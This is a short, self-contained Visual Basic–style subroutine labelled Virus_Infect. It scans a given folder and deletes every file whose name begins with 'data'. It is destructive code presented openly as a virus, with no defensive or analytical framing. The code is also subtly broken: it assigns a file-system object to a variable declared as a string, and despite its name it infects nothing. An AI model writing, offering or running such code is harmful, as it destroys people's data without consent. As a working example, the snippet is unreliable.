Sub Virus_Infect(Host As String)
    Dim FilePath As String
    Set FilePath = CreateObject("Scripting.FileSystemObject")
    
    For Each File In FilePath.GetFolder(Host).Files
        If Left(File.Name, 4) = "data" Then ' Check if file is data file
            File.Delete() ' Delete the file
        End If
    Next File
    
    Set FilePath = Nothing
End Sub
